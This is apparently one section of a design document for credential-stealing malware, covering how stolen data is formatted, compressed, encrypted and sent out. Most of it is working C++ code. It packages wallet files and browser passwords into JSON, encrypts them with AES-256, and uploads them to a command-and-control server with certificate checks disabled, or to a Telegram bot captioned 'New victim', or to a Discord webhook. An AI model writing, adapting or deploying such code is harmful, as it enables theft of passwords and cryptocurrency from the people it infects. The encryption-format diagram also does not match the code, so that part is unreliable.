# Output Processing & Exfiltration

## Document Purpose

This document details data formatting, compression, encryption, and transmission methods.

---

## Output Pipeline

```
┌─────────────────────────────────────────────────────────────┐
│                    OUTPUT PIPELINE                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌─────────────┐                                           │
│  │ Raw Data    │                                           │
│  │ (Blobs)     │                                           │
│  └──────┬──────┘                                           │
│         │                                                   │
│         ▼                                                   │
│  ┌─────────────┐                                           │
│  │ Formatter   │  → Convert to standard format            │
│  └──────┬──────┘                                           │
│         │                                                   │
│         ▼                                                   │
│  ┌─────────────┐                                           │
│  │ Aggregator  │  → Merge all module outputs              │
│  └──────┬──────┘                                           │
│         │                                                   │
│         ▼                                                   │
│  ┌─────────────┐                                           │
│  │ Compressor  │  → Reduce size (gzip/zlib)               │
│  └──────┬──────┘                                           │
│         │                                                   │
│         ▼                                                   │
│  ┌─────────────┐                                           │
│  │ Encryptor   │  → Encrypt (AES-256)                     │
│  └──────┬──────┘                                           │
│         │                                                   │
│         ▼                                                   │
│  ┌─────────────┐                                           │
│  │ Transport   │  → Send to endpoint                      │
│  └──────┬──────┘                                           │
│         │                                                   │
│         ▼                                                   │
│  ┌─────────────┐                                           │
│  │ Remote C2   │                                           │
│  └─────────────┘                                           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 1. Data Formatting

### JSON Output Format

```cpp
// formatter.cpp

struct OutputData {
    std::string hwid;
    std::string timestamp;
    std::string version;
    std::map<std::string, ModuleOutput> modules;
};

struct ModuleOutput {
    bool success;
    uint64_t executionTime;
    std::vector<FileOutput> files;
    std::vector<TextOutput> texts;
    std::map<std::string, std::string> metadata;
};

struct FileOutput {
    std::string name;
    std::string type;
    std::string mimeType;
    std::string content;  // Base64 encoded
    std::map<std::string, std::string> metadata;
};

class OutputFormatter {
public:
    OutputFormatter(const Config& config);
    
    std::string format(const std::vector<ExtractionResult>& results);
    
private:
    Config m_config;
    
    std::string formatAsJson(const OutputData& data);
    std::string formatAsXml(const OutputData& data);
    std::string formatAsBinary(const OutputData& data);
};

std::string OutputFormatter::format(
    const std::vector<ExtractionResult>& results) {
    
    OutputData output;
    output.hwid = getHWID();
    output.timestamp = getTimestamp();
    output.version = "1.0.0";
    
    // Process each module result
    for (const auto& result : results) {
        ModuleOutput moduleOut;
        moduleOut.success = result.success;
        moduleOut.executionTime = result.executionTimeMs;
        
        // Process each blob
        for (const auto& blob : result.blobs) {
            FileOutput fileOut;
            fileOut.name = blob.name;
            fileOut.type = blob.type;
            fileOut.mimeType = blob.mimeType;
            
            // Encode content as base64
            fileOut.content = base64Encode(blob.data);
            fileOut.metadata = blob.metadata;
            
            moduleOut.files.push_back(fileOut);
        }
        
        output.modules[result.moduleName] = moduleOut;
    }
    
    // Format based on configuration
    if (m_config.output.format == "json") {
        return formatAsJson(output);
    } else if (m_config.output.format == "xml") {
        return formatAsXml(output);
    } else {
        return formatAsBinary(output);
    }
}

std::string OutputFormatter::formatAsJson(const OutputData& data) {
    nlohmann::json j;
    
    j["hwid"] = data.hwid;
    j["timestamp"] = data.timestamp;
    j["version"] = data.version;
    
    for (const auto& [moduleName, moduleOut] : data.modules) {
        nlohmann::json moduleJson;
        moduleJson["success"] = moduleOut.success;
        moduleJson["execution_time"] = moduleOut.executionTime;
        
        for (const auto& file : moduleOut.files) {
            nlohmann::json fileJson;
            fileJson["name"] = file.name;
            fileJson["type"] = file.type;
            fileJson["mime"] = file.mimeType;
            fileJson["content"] = file.content;  // base64
            fileJson["metadata"] = file.metadata;
            
            moduleJson["files"].push_back(fileJson);
        }
        
        j["modules"][moduleName] = moduleJson;
    }
    
    return j.dump(2);  // Pretty print
}
```

### Example JSON Output

```json
{
  "hwid": "a3f5b8c2d1e4f7a9b0c3d6e8f1a2b5c7",
  "timestamp": "2024-01-15T10:30:45Z",
  "version": "1.0.0",
  "modules": {
    "wallet": {
      "success": true,
      "execution_time": 1250,
      "files": [
        {
          "name": "MetaMask_wallet",
          "type": "file",
          "mime": "application/octet-stream",
          "content": "UEsDBBQAAAAI...",
          "metadata": {
            "wallet": "MetaMask",
            "source_path": "C:\\Users\\...\\nkbihfbe...",
            "extracted_at": "2024-01-15T10:30:44Z"
          }
        }
      ]
    },
    "browser": {
      "success": true,
      "execution_time": 3420,
      "files": [
        {
          "name": "chrome_passwords",
          "type": "json",
          "mime": "application/json",
          "content": "W3sidXJsIjoiaHR0cHM6Ly8...",
          "metadata": {
            "browser": "chrome",
            "count": "47"
          }
        }
      ]
    },
    "system": {
      "success": true,
      "execution_time": 890,
      "files": [
        {
          "name": "system_info",
          "type": "json",
          "mime": "application/json",
          "content": "eyJod2lkIjoiYTNmNWI4YzJkMWU0...",
          "metadata": {
            "hwid": "a3f5b8c2d1e4f7a9b0c3d6e8f1a2b5c7"
          }
        }
      ]
    }
  }
}
```

---

## 2. Compression

### GZIP Compression

```cpp
// compressor.h

#pragma once

#include <vector>
#include <string>

class Compressor {
public:
    // Compress data
    static std::vector<uint8_t> gzip(const std::vector<uint8_t>& data);
    static std::vector<uint8_t> gzip(const std::string& data);
    
    // Decompress data
    static std::vector<uint8_t> gunzip(const std::vector<uint8_t>& data);
    
    // Compression level (0-9)
    static std::vector<uint8_t> gzip(const std::vector<uint8_t>& data, 
                                     int level);
    
private:
    static std::vector<uint8_t> compressWithZlib(
        const std::vector<uint8_t>& data, 
        int level
    );
};

// compressor.cpp

#include <zlib.h>

std::vector<uint8_t> Compressor::gzip(const std::vector<uint8_t>& data) {
    return gzip(data, 6);  // Default compression level
}

std::vector<uint8_t> Compressor::gzip(
    const std::vector<uint8_t>& data, 
    int level) {
    
    if (data.empty()) {
        return {};
    }
    
    z_stream stream = {};
    
    // Initialize with gzip window bits (15 + 16)
    if (deflateInit2(&stream, 
                     level, 
                     Z_DEFLATED, 
                     15 + 16,  // Window bits + gzip
                     8,        // Memory level
                     Z_DEFAULT_STRATEGY) != Z_OK) {
        throw std::runtime_error("deflateInit2 failed");
    }
    
    // Calculate maximum compressed size
    size_t maxCompressed = deflateBound(&stream, data.size());
    std::vector<uint8_t> compressed(maxCompressed);
    
    // Set input
    stream.next_in = (Bytef*)data.data();
    stream.avail_in = data.size();
    
    // Set output
    stream.next_out = compressed.data();
    stream.avail_out = maxCompressed;
    
    // Compress
    int ret = deflate(&stream, Z_FINISH);
    if (ret != Z_STREAM_END) {
        deflateEnd(&stream);
        throw std::runtime_error("deflate failed");
    }
    
    // Resize to actual size
    compressed.resize(stream.total_out);
    
    // Cleanup
    deflateEnd(&stream);
    
    return compressed;
}

// Usage
std::string jsonOutput = formatter.format(results);
std::vector<uint8_t> compressed = Compressor::gzip(jsonOutput);

// Typical compression ratios:
// JSON: 70-80% reduction
// Binary files: 10-30% reduction
// Already compressed files: 0-5% reduction (or increase)
```

### ZIP Archive (Multiple Files)

```cpp
// archiver.cpp

#include <minizip/zip.h>

class Archiver {
public:
    static std::vector<uint8_t> createZip(
        const std::vector<FileEntry>& files);
    
private:
    static int addFileToZip(zipFile zf, 
                            const std::string& name,
                            const std::vector<uint8_t>& data);
};

struct FileEntry {
    std::string name;
    std::vector<uint8_t> data;
    std::string comment;
};

std::vector<uint8_t> Archiver::createZip(
    const std::vector<FileEntry>& files) {
    
    // Create ZIP in memory
    std::stringstream ss;
    zlib_filefunc_def filefunc;
    fill_memory_filefunc(&filefunc, &ss);
    
    zipFile zf = zipOpen2("__memory__", 
                          APPEND_STATUS_CREATE, 
                          NULL, 
                          &filefunc);
    
    if (!zf) {
        throw std::runtime_error("Failed to create ZIP");
    }
    
    // Add each file
    for (const auto& file : files) {
        addFileToZip(zf, file.name, file.data);
    }
    
    // Close and get data
    zipClose(zf, NULL);
    
    // Extract from stringstream
    std::string zipData = ss.str();
    return std::vector<uint8_t>(zipData.begin(), zipData.end());
}

int Archiver::addFileToZip(zipFile zf,
                           const std::string& name,
                           const std::vector<uint8_t>& data) {
    
    zip_fileinfo zi = {};
    zi.dosDate = (uLong)time(NULL);
    
    // Open new file in ZIP
    if (zipOpenNewFileInZip(zf,
                            name.c_str(),
                            &zi,
                            NULL, 0,
                            NULL, 0,
                            NULL,
                            Z_DEFLATED,
                            Z_DEFAULT_COMPRESSION) != ZIP_OK) {
        return -1;
    }
    
    // Write data
    if (zipWriteInFileInZip(zf, data.data(), data.size()) != ZIP_OK) {
        return -1;
    }
    
    // Close file in ZIP
    zipCloseFileInZip(zf);
    
    return 0;
}
```

---

## 3. Encryption

### AES-256 Encryption

```cpp
// encryptor.h

#pragma once

#include <vector>
#include <string>

class Encryptor {
public:
    // Generate random key
    static std::vector<uint8_t> generateKey();
    static std::vector<uint8_t> generateKey(const std::string& password);
    
    // Encrypt data
    static std::vector<uint8_t> encrypt(
        const std::vector<uint8_t>& data,
        const std::vector<uint8_t>& key
    );
    
    // Decrypt data
    static std::vector<uint8_t> decrypt(
        const std::vector<uint8_t>& data,
        const std::vector<uint8_t>& key
    );
    
    // Encrypt with password (PBKDF2 key derivation)
    static std::vector<uint8_t> encryptWithPassword(
        const std::vector<uint8_t>& data,
        const std::string& password
    );
    
private:
    static std::vector<uint8_t> deriveKey(
        const std::string& password,
        const std::vector<uint8_t>& salt
    );
};

// encryptor.cpp

#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

std::vector<uint8_t> Encryptor::generateKey() {
    std::vector<uint8_t> key(32);  // 256 bits
    RAND_bytes(key.data(), key.size());
    return key;
}

std::vector<uint8_t> Encryptor::encrypt(
    const std::vector<uint8_t>& data,
    const std::vector<uint8_t>& key) {
    
    if (key.size() != 32) {
        throw std::invalid_argument("Key must be 32 bytes");
    }
    
    // Generate random IV (16 bytes for AES)
    std::vector<uint8_t> iv(16);
    RAND_bytes(iv.data(), iv.size());
    
    // Create cipher context
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key.data(), iv.data());
    
    // Calculate max ciphertext size
    std::vector<uint8_t> ciphertext(data.size() + EVP_MAX_BLOCK_LENGTH);
    int len;
    int ciphertextLen = 0;
    
    // Encrypt
    if (EVP_EncryptUpdate(ctx, 
                          ciphertext.data(), 
                          &len, 
                          data.data(), 
                          data.size()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Encryption failed");
    }
    ciphertextLen = len;
    
    // Finalize
    if (EVP_EncryptFinal_ex(ctx, 
                            ciphertext.data() + len, 
                            &len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Encryption finalization failed");
    }
    ciphertextLen += len;
    
    // Resize
    ciphertext.resize(ciphertextLen);
    
    // Cleanup
    EVP_CIPHER_CTX_free(ctx);
    
    // Prepend IV to ciphertext
    ciphertext.insert(ciphertext.begin(), iv.begin(), iv.end());
    
    return ciphertext;
}

std::vector<uint8_t> Encryptor::encryptWithPassword(
    const std::vector<uint8_t>& data,
    const std::string& password) {
    
    // Generate random salt (16 bytes)
    std::vector<uint8_t> salt(16);
    RAND_bytes(salt.data(), salt.size());
    
    // Derive key from password using PBKDF2
    std::vector<uint8_t> key = deriveKey(password, salt);
    
    // Encrypt
    std::vector<uint8_t> ciphertext = encrypt(data, key);
    
    // Prepend salt to ciphertext
    ciphertext.insert(ciphertext.begin(), salt.begin(), salt.end());
    
    return ciphertext;
}

std::vector<uint8_t> Encryptor::deriveKey(
    const std::string& password,
    const std::vector<uint8_t>& salt) {
    
    std::vector<uint8_t> key(32);  // 256 bits
    
    // PBKDF2 with 100,000 iterations
    PKCS5_PBKDF2_HMAC(
        password.c_str(),
        password.size(),
        salt.data(),
        salt.size(),
        100000,  // Iterations
        EVP_sha256(),
        32,  // Key length
        key.data()
    );
    
    return key;
}

// Usage
std::vector<uint8_t> data = /* compressed output */;
std::vector<uint8_t> encrypted = Encryptor::encryptWithPassword(data, "secret");
```

### Encryption Format

```
┌─────────────────────────────────────────────────────────────┐
│                 ENCRYPTED DATA FORMAT                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  WITH PASSWORD:                                             │
│  ┌────────────────────────────────────────────────────┐    │
│  │ Salt (16) │ IV (16) │ Ciphertext │ Tag (16)       │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  WITH KEY:                                                  │
│  ┌────────────────────────────────────────────────────┐    │
│  │ IV (16) │ Ciphertext │ Tag (16)                   │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  SALT: Random bytes for key derivation                     │
│  IV: Random initialization vector                          │
│  CIPHERTEXT: Encrypted data                                │
│  TAG: Authentication tag (GCM mode)                        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 4. Exfiltration Methods

### HTTPS POST

```cpp
// https_client.h

#pragma once

#include <string>
#include <vector>
#include <map>

class HTTPSClient {
public:
    HTTPSClient(const std::string& baseUrl, int timeout = 30);
    
    // POST data
    bool post(const std::string& endpoint,
              const std::vector<uint8_t>& data,
              const std::map<std::string, std::string>& headers = {});
    
    // POST with retry
    bool postWithRetry(const std::string& endpoint,
                       const std::vector<uint8_t>& data,
                       int maxRetries = 3);
    
    // Get last error
    std::string getLastError() const;
    
private:
    std::string m_baseUrl;
    int m_timeout;
    std::string m_lastError;
    
    bool sendRequest(CURL* curl,
                     const std::string& url,
                     const std::vector<uint8_t>& data,
                     const std::map<std::string, std::string>& headers);
};

// https_client.cpp

#include <curl/curl.h>

HTTPSClient::HTTPSClient(const std::string& baseUrl, int timeout)
    : m_baseUrl(baseUrl), m_timeout(timeout) {
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
}

bool HTTPSClient::post(
    const std::string& endpoint,
    const std::vector<uint8_t>& data,
    const std::map<std::string, std::string>& headers) {
    
    std::string url = m_baseUrl + endpoint;
    
    CURL* curl = curl_easy_init();
    if (!curl) {
        m_lastError = "Failed to initialize CURL";
        return false;
    }
    
    // Set URL
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    
    // Set timeout
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, m_timeout);
    
    // Set headers
    struct curl_slist* headerList = NULL;
    headerList = curl_slist_append(headerList, "Content-Type: application/octet-stream");
    
    for (const auto& [key, value] : headers) {
        std::string header = key + ": " + value;
        headerList = curl_slist_append(headerList, header.c_str());
    }
    
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerList);
    
    // Set POST data
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, data.size());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.data());
    
    // Ignore SSL verification (for C2)
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    // Execute
    CURLcode res = curl_easy_perform(curl);
    
    // Cleanup
    curl_slist_free_all(headerList);
    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK) {
        m_lastError = curl_easy_strerror(res);
        return false;
    }
    
    return true;
}

bool HTTPSClient::postWithRetry(
    const std::string& endpoint,
    const std::vector<uint8_t>& data,
    int maxRetries) {
    
    for (int i = 0; i < maxRetries; ++i) {
        if (post(endpoint, data)) {
            return true;
        }
        
        // Wait before retry (exponential backoff)
        int waitTime = (1 << i) * 1000;  // 1s, 2s, 4s
        std::this_thread::sleep_for(std::chrono::milliseconds(waitTime));
    }
    
    return false;
}

// Usage
std::vector<uint8_t> encryptedData = /* encrypted output */;

HTTPSClient client("https://c2.example.com");

std::map<std::string, std::string> headers;
headers["X-HWID"] = getHWID();
headers["X-Version"] = "1.0.0";

bool success = client.postWithRetry("/api/upload", encryptedData, headers);
```

### Telegram Bot API

```cpp
// telegram_client.cpp

#include <curl/curl.h>

class TelegramClient {
public:
    TelegramClient(const std::string& botToken, 
                   const std::string& chatId);
    
    bool sendDocument(const std::vector<uint8_t>& data,
                      const std::string& filename,
                      const std::string& caption = "");
    
private:
    std::string m_botToken;
    std::string m_chatId;
};

TelegramClient::TelegramClient(const std::string& botToken,
                               const std::string& chatId)
    : m_botToken(botToken), m_chatId(chatId) {}

bool TelegramClient::sendDocument(
    const std::vector<uint8_t>& data,
    const std::string& filename,
    const std::string& caption) {
    
    std::string url = "https://api.telegram.org/bot" + 
                      m_botToken + "/sendDocument";
    
    CURL* curl = curl_easy_init();
    if (!curl) {
        return false;
    }
    
    // Build multipart form
    struct curl_httppost* formPost = NULL;
    struct curl_httppost* lastPtr = NULL;
    
    curl_formadd(&formPost, &lastPtr,
                 CURLFORM_COPYNAME, "chat_id",
                 CURLFORM_COPYCONTENTS, m_chatId.c_str(),
                 CURLFORM_END);
    
    if (!caption.empty()) {
        curl_formadd(&formPost, &lastPtr,
                     CURLFORM_COPYNAME, "caption",
                     CURLFORM_COPYCONTENTS, caption.c_str(),
                     CURLFORM_END);
    }
    
    curl_formadd(&formPost, &lastPtr,
                 CURLFORM_COPYNAME, "document",
                 CURLFORM_BUFFER, filename.c_str(),
                 CURLFORM_BUFFERPTR, data.data(),
                 CURLFORM_BUFFERLENGTH, data.size(),
                 CURLFORM_END);
    
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPPOST, formPost);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60);
    
    // Execute
    CURLcode res = curl_easy_perform(curl);
    
    // Cleanup
    curl_formfree(formPost);
    curl_easy_cleanup(curl);
    
    return res == CURLE_OK;
}

// Usage
TelegramClient telegram("1234567890:ABCdefGHIjklMNOpqrsTUVwxyz", 
                        "-1001234567890");

std::string caption = "New victim: " + getHWID();
telegram.sendDocument(encryptedData, "logs.zip", caption);
```

### Discord Webhook

```cpp
// discord_client.cpp

class DiscordClient {
public:
    DiscordClient(const std::string& webhookUrl);
    
    bool sendFile(const std::vector<uint8_t>& data,
                  const std::string& filename,
                  const std::string& content = "");
    
private:
    std::string m_webhookUrl;
};

DiscordClient::DiscordClient(const std::string& webhookUrl)
    : m_webhookUrl(webhookUrl) {}

bool DiscordClient::sendFile(
    const std::vector<uint8_t>& data,
    const std::string& filename,
    const std::string& content) {
    
    CURL* curl = curl_easy_init();
    if (!curl) {
        return false;
    }
    
    // Build multipart form
    struct curl_httppost* formPost = NULL;
    struct curl_httppost* lastPtr = NULL;
    
    // Payload JSON
    nlohmann::json payload;
    if (!content.empty()) {
        payload["content"] = content;
    }
    
    std::string payloadStr = payload.dump();
    
    curl_formadd(&formPost, &lastPtr,
                 CURLFORM_COPYNAME, "payload_json",
                 CURLFORM_COPYCONTENTS, payloadStr.c_str(),
                 CURLFORM_END);
    
    curl_formadd(&formPost, &lastPtr,
                 CURLFORM_COPYNAME, "file",
                 CURLFORM_BUFFER, filename.c_str(),
                 CURLFORM_BUFFERPTR, data.data(),
                 CURLFORM_BUFFERLENGTH, data.size(),
                 CURLFORM_END);
    
    curl_easy_setopt(curl, CURLOPT_URL, m_webhookUrl.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPPOST, formPost);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60);
    
    CURLcode res = curl_easy_perform(curl);
    
    curl_formfree(formPost);
    curl_easy_cleanup(curl);
    
    return res == CURLE_OK;
}
```

---

## 5. Complete Exfiltration Module

```cpp
// exfiltration.h

#pragma once

#include "https_client.h"
#include "telegram_client.h"
#include "discord_client.h"

enum class ExfilMethod {
    HTTPS,
    Telegram,
    Discord,
    DNS
};

class Exfiltration {
public:
    Exfiltration(const Config& config);
    
    bool send(const std::vector<uint8_t>& data);
    std::string getLastError() const;
    
private:
    Config m_config;
    std::unique_ptr<HTTPSClient> m_httpsClient;
    std::unique_ptr<TelegramClient> m_telegramClient;
    std::unique_ptr<DiscordClient> m_discordClient;
    std::string m_lastError;
    
    bool sendViaHTTPS(const std::vector<uint8_t>& data);
    bool sendViaTelegram(const std::vector<uint8_t>& data);
    bool sendViaDiscord(const std::vector<uint8_t>& data);
};

Exfiltration::Exfiltration(const Config& config) 
    : m_config(config) {
    
    if (config.exfil.method == "https") {
        m_httpsClient = std::make_unique<HTTPSClient>(
            config.exfil.endpoint
        );
    } else if (config.exfil.method == "telegram") {
        // Parse telegram://BOT_TOKEN/CHAT_ID
        auto parts = parseTelegramUrl(config.exfil.endpoint);
        m_telegramClient = std::make_unique<TelegramClient>(
            parts.token, 
            parts.chatId
        );
    } else if (config.exfil.method == "discord") {
        m_discordClient = std::make_unique<DiscordClient>(
            config.exfil.endpoint
        );
    }
}

bool Exfiltration::send(const std::vector<uint8_t>& data) {
    if (m_config.exfil.method == "https") {
        return sendViaHTTPS(data);
    } else if (m_config.exfil.method == "telegram") {
        return sendViaTelegram(data);
    } else if (m_config.exfil.method == "discord") {
        return sendViaDiscord(data);
    }
    
    m_lastError = "Unknown exfil method";
    return false;
}

bool Exfiltration::sendViaHTTPS(const std::vector<uint8_t>& data) {
    std::map<std::string, std::string> headers;
    headers["X-HWID"] = getHWID();
    headers["X-Version"] = "1.0.0";
    headers["X-Timestamp"] = getTimestamp();
    
    return m_httpsClient->postWithRetry(
        "/api/upload", 
        data, 
        m_config.exfil.retryCount
    );
}

bool Exfiltration::sendViaTelegram(const std::vector<uint8_t>& data) {
    std::string caption = "📦 New Data\n"
                          "HWID: " + getHWID() + "\n"
                          "Time: " + getTimestamp() + "\n"
                          "Size: " + std::to_string(data.size()) + " bytes";
    
    return m_telegramClient->sendDocument(data, "logs.zip", caption);
}

bool Exfiltration::sendViaDiscord(const std::vector<uint8_t>& data) {
    std::string content = "📦 New Data | HWID: `" + getHWID() + "`";
    return m_discordClient->sendFile(data, "logs.zip", content);
}
```

---

**Document:** 05/06  
**Version:** 1.0  
**Classification:** Technical Architecture
